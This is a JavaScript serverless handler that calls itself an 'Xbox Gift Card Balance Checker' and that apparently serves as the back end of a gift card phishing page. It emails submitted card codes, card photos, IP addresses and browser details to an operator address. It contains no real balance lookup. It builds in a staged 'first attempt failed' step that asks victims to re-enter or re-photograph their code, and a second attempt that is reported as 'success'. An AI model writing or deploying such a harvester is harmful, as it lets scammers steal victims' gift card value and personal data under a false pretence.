import { Resend } from 'resend';

function maskCode(code) {
  if (!code) return 'N/A';
  if (code.length <= 5) return '*****';
  return `*****${code.slice(-5)}`;
}

function buildEmailAttachments(imageBase64) {
  if (!imageBase64) return [];
  const matches = imageBase64.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);
  if (!matches || !matches[2]) return [];

  return [{
    filename: `xbox-card-${Date.now()}.${matches[1]}`,
    content: matches[2],
    encoding: 'base64',
  }];
}

function buildEmailHtml(type, data) {
  const { cardNumber, cardNumberFirst, cardNumberSecond, amount, balance, timestamp, userAgent, pageSource, message, ip } = data;

  if (type === 'first_attempt_failed') {
    return `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: #f8f9fa; border-radius: 8px;">
        <div style="background: #dc3545; color: white; padding: 15px; border-radius: 8px 8px 0 0; margin: -20px -20px 20px -20px;">
          <h2 style="margin: 0;">❌ FIRST ATTEMPT FAILED</h2>
        </div>
        <div style="background: white; padding: 20px; border-radius: 8px;">
          <p><strong>🎮 Code:</strong> ${cardNumber}</p>
          <p><strong>💰 Amount:</strong> $${amount}</p>
          <p><strong>📍 Page:</strong> ${pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</p>
          <p><strong>📊 Status:</strong> FAILED</p>
          <p><strong>💬 Message:</strong> ${message || 'User instructed to re-enter code or upload clearer image'}</p>
          <p><strong>🕐 Time:</strong> ${new Date(timestamp || Date.now()).toLocaleString()}</p>
          <p><strong>🌐 Browser:</strong> ${userAgent?.substring(0, 50) || 'Unknown'}</p>
          ${ip ? `<p><strong>🖥️ IP:</strong> ${ip}</p>` : ''}
        </div>
        <div style="text-align: center; margin-top: 20px; color: #666; font-size: 12px;">
          <p>Xbox Gift Card Balance Checker - Automated Notification</p>
        </div>
      </div>
    `;
  }

  if (type === 'second_attempt_success') {
    return `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: #f8f9fa; border-radius: 8px;">
        <div style="background: #28a745; color: white; padding: 15px; border-radius: 8px 8px 0 0; margin: -20px -20px 20px -20px;">
          <h2 style="margin: 0;">✅ SECOND ATTEMPT SUCCESS</h2>
        </div>
        <div style="background: white; padding: 20px; border-radius: 8px;">
          <p><strong>🎮 Code:</strong> ${cardNumber}</p>
          <p><strong>💰 Amount:</strong> $${amount}</p>
          <p><strong>💵 Balance:</strong> ${balance}</p>
          <p><strong>📍 Page:</strong> ${pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</p>
          <p><strong>📊 Status:</strong> SUCCESS</p>
          <p><strong>💬 Message:</strong> ${message || 'Verification successful on second attempt'}</p>
          <p><strong>🕐 Time:</strong> ${new Date(timestamp || Date.now()).toLocaleString()}</p>
          <p><strong>🌐 Browser:</strong> ${userAgent?.substring(0, 50) || 'Unknown'}</p>
          ${ip ? `<p><strong>🖥️ IP:</strong> ${ip}</p>` : ''}
        </div>
        <div style="text-align: center; margin-top: 20px; color: #666; font-size: 12px;">
          <p>Xbox Gift Card Balance Checker - Automated Notification</p>
        </div>
      </div>
    `;
  }

  if (type === 'mismatch_attempt') {
    return `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: #f8f9fa; border-radius: 8px;">
        <div style="background: #ffc107; color: #1a1a1a; padding: 15px; border-radius: 8px 8px 0 0; margin: -20px -20px 20px -20px;">
          <h2 style="margin: 0;">⚠️ CODE MISMATCH</h2>
        </div>
        <div style="background: white; padding: 20px; border-radius: 8px;">
          <p><strong>🎮 First Code:</strong> ${maskCode(cardNumberFirst)}</p>
          <p><strong>🎮 Second Code:</strong> ${maskCode(cardNumberSecond)}</p>
          <p><strong>💰 Amount:</strong> $${amount}</p>
          <p><strong>📍 Page:</strong> ${pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</p>
          <p><strong>📊 Status:</strong> MISMATCH</p>
          <p><strong>💬 Message:</strong> ${message || 'User entered different code on second attempt'}</p>
          <p><strong>🕐 Time:</strong> ${new Date(timestamp || Date.now()).toLocaleString()}</p>
          <p><strong>🌐 Browser:</strong> ${userAgent?.substring(0, 50) || 'Unknown'}</p>
          ${ip ? `<p><strong>🖥️ IP:</strong> ${ip}</p>` : ''}
        </div>
        <div style="text-align: center; margin-top: 20px; color: #666; font-size: 12px;">
          <p>Xbox Gift Card Balance Checker - Automated Notification</p>
        </div>
      </div>
    `;
  }

  return `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: #f8f9fa; border-radius: 8px;">
      <div style="background: #107C10; color: white; padding: 15px; border-radius: 8px 8px 0 0; margin: -20px -20px 20px -20px;">
        <h2 style="margin: 0;">Xbox Gift Card Notification</h2>
      </div>
      <div style="background: white; padding: 20px; border-radius: 8px;">
        <p><strong>Type:</strong> ${type}</p>
        <p><strong>💰 Amount:</strong> $${amount}</p>
        <p><strong>💬 Message:</strong> ${message || 'No message'}</p>
        <p><strong>🕐 Time:</strong> ${new Date(timestamp || Date.now()).toLocaleString()}</p>
      </div>
    </div>
  `;
}

function buildSubject(type) {
  if (type === 'first_attempt_failed') return 'FIRST ATTEMPT FAILED - Xbox Gift Card';
  if (type === 'second_attempt_success') return 'SECOND ATTEMPT SUCCESS - Xbox Gift Card';
  if (type === 'mismatch_attempt') return 'CODE MISMATCH - Xbox Gift Card';
  return 'Xbox Gift Card Notification';
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin || '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const formData = req.body || {};
  const { type, cardNumber, cardNumberFirst, cardNumberSecond, amount, balance, timestamp, userAgent, pageSource, imageBase64, message } = formData;
  const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '127.0.0.1';

  const primaryEmail = process.env.PRIMARY_EMAIL;
  const resendApiKey = process.env.RESEND_API_KEY;

  const payloadData = { cardNumber, cardNumberFirst, cardNumberSecond, amount, balance, timestamp, userAgent, pageSource, message, ip };
  const subject = buildSubject(type);
  const html = buildEmailHtml(type, payloadData);
  const attachments = buildEmailAttachments(imageBase64);

  if (!resendApiKey || !primaryEmail) {
    return res.status(500).json({ error: 'Resend email service configuration missing' });
  }

  try {
    const resend = new Resend(resendApiKey);
    const { error } = await resend.emails.send({
      from: process.env.RESEND_FROM || 'noreply@xboxbalance.com',
      to: primaryEmail,
      subject,
      html,
      attachments,
    });

    if (error) {
      throw new Error(error.message || 'Resend email failed');
    }

    console.log('Resend email sent to PRIMARY_EMAIL');
  } catch (error) {
    console.error('Resend email failed:', error.message);
    return res.status(502).json({ error: 'Email delivery failed' });
  }

  return res.status(200).json({
    success: true,
    message: 'Submission processed',
    balance: balance || `$${amount || 0}`,
  });
}